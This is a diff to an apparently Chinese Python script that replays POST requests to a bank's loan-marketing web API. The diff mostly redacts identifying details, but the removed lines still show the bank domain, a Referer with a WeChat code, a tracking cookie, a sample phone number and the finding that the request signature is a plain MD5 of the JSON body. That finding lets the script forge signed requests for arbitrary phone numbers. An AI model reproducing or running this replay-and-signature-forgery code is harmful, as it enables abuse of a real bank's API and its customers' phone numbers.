@@ -1,13 +1,11 @@
 '''
 
 
-https://fcloud.zjtlcb.com/huokeapi/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+https://fcloud. XXXXXXXXXXXXXXXXXXXXXXXXXX
 post
 报文重放
 
-在js中  追踪分析  i.sign 生成流程，发现实使用md5  对特定字符串进行加密。
-
-亲测有效
+在js中  追踪分析  
           2023.6.14
 '''
 
@@ -38,9 +36,9 @@ from requests.cookies import RequestsCookieJar
 
 requests.packages.urllib3.disable_warnings()
 
-url1 = 'https://fcloud.zjtlcb.com/huokeapi/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+url1 = 'https:///xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
 
-############ 为防止对银行伤害， url1设置了XXXXXXXXXXXXXXXXX  
+############ 为防止 伤害， url1设置了XXXXXXXXXXXXXXXXX  
 
 jsessionid = 'sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22188b8834f10c13-0e066f643bb0a8-26031d51-1049088-188b8834f11655%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%22188b8834f10c13-0e066f643bb0a8-26031d51-1049088-188b8834f11655%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTg4YjhlYjFiY2Q2MjMtMDY4YWYwNTY4NmZjZmFjLTI2MDMxZDUxLTEwNDkwODgtMTg4YjhlYjFiY2UxMGQ0In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D'
 
@@ -59,7 +57,7 @@ headers1 = {
     , 'Origin': 'https://fcloud.zjtlcb.com'
     # ,'PE-AJAX': 'true'
     ,
-    'Referer': 'https://fcloud.zjtlcb.com/dc/sdkH5/?bussType=060&c=L081011&wxCode=oSTQctyt0GZt-M0bhypS-Q0rf9dE&wechatID=tlbank1993&qrcodeBlngSys=IBANK'
+    'Referer': 'https://*******************ANK'
     , 'Sec-Fetch-Dest': 'empty'
     , 'Sec-Fetch-Mode': 'cors'
     , 'Sec-Fetch-Site': 'same-origin'
@@ -113,7 +111,7 @@ def process1(tel) -> int:
         }
     }
 
-    ooo = "{\"bussType\":\"TAIELOAN\",\"channelId\":\"L081011\",\"mobile\":\"18100007766\",\"txSno\":\"HD1686731545743\"}"
+    ooo = "{\"bussType\":******************************545743\"}"
     sign = md5(ooo)
     #print(sign)
     '''
